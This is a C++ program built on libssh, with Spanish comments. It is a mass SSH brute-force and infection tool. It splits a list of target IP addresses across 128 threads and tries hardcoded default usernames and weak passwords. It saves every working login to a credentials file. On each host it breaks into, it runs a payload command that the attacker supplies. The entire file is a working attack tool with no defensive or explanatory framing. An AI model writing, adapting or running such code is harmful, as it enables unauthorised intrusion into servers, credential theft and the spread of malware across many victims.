#include <libssh/libssh.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <string>
#include <thread>
#include <chrono>


using namespace std;


// VARIABLES
unsigned long long int cargados = 0;
unsigned long long int intentos = 0;
unsigned long long int ips = 0;
unsigned long int bruteados = 0;

string IPstxt;
string payload;
string payloadTXT;
string credencialesUsuarios[8] = 
{
    "root",
    "user",
    "admin",
    "pi",
    "ubuntu",
    "administrator",
    "centos",
    "debian"
};
string credencialesContra[24] = {
    "123456",
    "password",
    "123456789",
    "12345678",
    "12345",
    "111111",
    "1234567",
    "admin",
    "1234567890",
    "000000",
    "root",
    "administrator",
    "password123",
    "abc123",
    "ubuntu",
    "debian",
    "default",
    "hello",
    "changeme",
    "1234",
    "root123",
    "admin123",
    "default123",
    "1234"
};

vector<vector<string>> IPsUsar(128);
vector<string> sshs;



// LOGS
void log(short int tipo, string texto)
{
    if (tipo == 0)
    {
        cout << "[o] " + texto << endl;
    }

    if (tipo == 1)
    {
        cout << "[+] " + texto << endl;
    }

    if (tipo == 2)
    {
        cerr << "[!] " + texto << endl;
    }
}



// CARGAR IPs
void cargarIPs()
{
    log(0, "Loading IP addresses from \"" + IPstxt + "\"...");
    
    // VARIABLES
    ifstream IPstxtF(IPstxt);
    string lineaIP;
    unsigned long long int c1 = 0;


    // TXT -> ARRAY
    while (getline(IPstxtF, lineaIP)) 
    {
        c1++;

        if (c1 != 128)
        {
            IPsUsar[c1-1].push_back(lineaIP);
        }

        else 
        {
            IPsUsar[c1-1].push_back(lineaIP);
            c1 = 0;
        }

        cargados++;
    }
 
    log(1, to_string(cargados) + " IPs have been loaded successfully.");
    IPstxtF.close();
    

    // CARGAR PAYLOAD
    ifstream payloadArchivo(payloadTXT);
    payload = string((istreambuf_iterator<char>(payloadArchivo)), istreambuf_iterator<char>());
    payloadArchivo.close();
}



// GUARDAR IPS
void guardarIps(string credenciales)
{
    ofstream archivoCredenciales("ssh_credentials.txt", ios::app);

    archivoCredenciales << credenciales.c_str() << endl;

    archivoCredenciales.close();
}


// REALIZAR CONEXIÓN + INFECCIÓN
void conectarEinfectar(short int hilo, short int usuario)
{

    for (const string &ipUsar : IPsUsar[hilo])
    {
        bool conexionBruteada = false;

        // EMPEZAR BRUTEO
        for (unsigned short int c1 = 0; c1 < 24 && !conexionBruteada; c1++)
        {
            // INICIAR SSH
            ssh_session conexion = ssh_new();

            if (conexion == nullptr)
            {
                log(2, "An error occurred while SSH was starting.");
                return;
            }

            // REALIZAR CONEXION
            ssh_options_set(conexion, SSH_OPTIONS_HOST, ipUsar.c_str());
            ssh_options_set(conexion, SSH_OPTIONS_USER, credencialesUsuarios[usuario].c_str());
            short int estado = ssh_connect(conexion);
                

            // CHECAR SI SE REALIZO
            if (estado == SSH_OK)
            {
                // PONER CREDENCIALES
                estado = ssh_userauth_password(conexion, nullptr, credencialesContra[c1].c_str());
                if (estado == SSH_AUTH_SUCCESS)
                {
                    guardarIps(string(credencialesUsuarios[usuario] + "@" + ipUsar + " " +  credencialesContra[c1]));


                    // REALIZAR INFECCIÓN
                    ssh_channel terminal = ssh_channel_new(conexion);

                    if (terminal != nullptr) 
                    {
                        estado = ssh_channel_open_session(terminal);
                        if (estado == SSH_OK) 
                        {
                            ssh_channel_request_exec(terminal, payload.c_str());
                        }

                        else 
                        {
                            log(2, "Ha ocurrido un error al infectar la máquina.");
                        }
                    }

                    else 
                    {
                        log(2, "Ha ocurrido un error al infectar la máquina.");
                    }

                        
                    // DESCONECTARSE
                    ssh_channel_send_eof(terminal);
                    ssh_channel_close(terminal);
                    ssh_channel_free(terminal);

                    bruteados++;
                    conexionBruteada = true;
                }
            }

          
            ssh_disconnect(conexion);
            ssh_free(conexion);
            
            intentos++;
        }


        ips++;
    }
}



// STATS
void stats()
{
    while (true)
    {
        log(0, "IPs: " + to_string(ips/8) + "/" + to_string(cargados) + " | Attempts: " + to_string(intentos) + " | Bruted: " + to_string(bruteados));
        this_thread::sleep_for(chrono::minutes(1));
    }
}




int main(int argc, char* argv[])
{
    // ARCHIVO CON IPs
    if (argc != 3)
    {
        log(2, "Invalid usage, try with: " + string(argv[0]) + " ips_file.txt" + " payload_command.txt");
        return 1;
    }

    IPstxt = argv[1];
    payloadTXT = argv[2];
    cargarIPs();



    // INICIAR THREADS
    vector<thread> threads;
    size_t usuarios = sizeof(credencialesUsuarios) / sizeof(credencialesUsuarios[0]);


    log(0, "Starting 128 threads...");

    for (short int c2 = 0; c2 < 128; c2++)
    { 
        for (short int c1 = 0; c1 < usuarios; c1++) 
        {
            threads.push_back(thread(conectarEinfectar, c2, c1));
        }
    }

    log(1, "All threads have been started successfully.");


    thread stats_T(stats);
    stats_T.join();


    for (auto& usuario : threads) 
    {
        usuario.join();
    }
}
